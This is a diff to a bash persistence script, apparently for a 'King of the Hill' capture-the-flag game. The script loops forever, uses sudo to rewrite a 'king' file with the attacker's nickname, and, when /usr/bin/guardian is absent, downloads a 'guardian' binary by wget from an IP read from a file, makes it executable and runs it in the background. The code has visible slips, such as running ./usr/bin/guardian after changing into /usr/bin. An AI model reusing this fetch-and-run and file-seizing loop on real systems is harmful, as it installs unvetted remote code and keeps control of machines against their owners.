@@ -9,21 +9,22 @@ if [ -f "$ip_file" ]; then
     ip_address=$(head -n 1 "$ip_file")
 fi
 
-if [ -f "$nick_file" ]; then
-    nick=$(head -n 1 "$nick_file")
-fi
-
 while true; do
     current_nick=$(sudo cat "$king_txt")
-    if [ "$current_nick" != "$nick" ]; then
-        echo "$nick" >> "$king_txt"
-        sudo tee "$king_txt" >/dev/null <<< "$nick"
-    fi
 
-    if [ ! -f "/usr/bin/guardian" ]; then
-        ip_file=$(cat "$ip_file")
-        cd /usr/bin && wget "http://$ip_file/guardian" && chmod +x guardian
-        ./usr/bin/guardian &
+    if [ -f "$nick_file" ]; then
+        nick=$(head -n 1 "$nick_file")
+
+        if [ "$current_nick" != "$nick" ]; then
+            echo "$nick" >> "$king_txt"
+            sudo tee "$king_txt" >/dev/null <<< "$nick"
+        fi
+
+        if [ ! -f "/usr/bin/guardian" ]; then
+            ip_file=$(cat "$ip_file")
+            cd /usr/bin && wget "http://$ip_file/guardian" && chmod +x guardian
+            ./usr/bin/guardian &
+        fi
     fi
 
     sleep 0.5
